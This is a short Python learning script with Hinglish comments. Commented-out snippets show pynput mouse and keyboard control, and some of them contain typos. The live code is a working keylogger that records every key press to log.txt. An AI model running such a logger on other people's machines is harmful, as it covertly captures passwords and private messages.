#to control the mouse
#from pynput.mouse import controller
#def controlmouse():
#mouse = controller()
#mouse.position=(420,96)  -->the cursor will move to that pixel position(x,y)
#controlmouse()   -->the moment ill call this function, the cursor will move to that position

#to control keyboard
#from pynput.keyboard import controller
#def controlkey():
#key = controller()
#keyboard.type("kuch bhi lmaooo")
#comtrolkeyboard()  -->the key board will send that without u pressing the key

#to listen to mouse location
#from pynput.mouse import Listener
#def fulljasoosi(x,y):
#print("the position is:[0]".format((x,y)))
#with Listener(on_move=fulljasoosi) as l:
 #l.join()



from pynput.keyboard import Listener

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "") #will remove ' after every word that join() adds

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l": 
        letter = ""
    if letter == "Key.enter":
        letter = "\n"

    with open("log.txt", 'a') as f:
        f.write(letter)
        
# r-reading w-writing a-append to file

# Collecting events until stopped

with Listener(on_press=write_to_file) as l:
    l.join()
    
    #join- will merge key strokes together
    #Listener- listen to key strokes
    #with- releases memory automattically so we dont have to f.close() it again n again kyuki program doesnt know when to stop
    #on_press- will work when a key is pressed


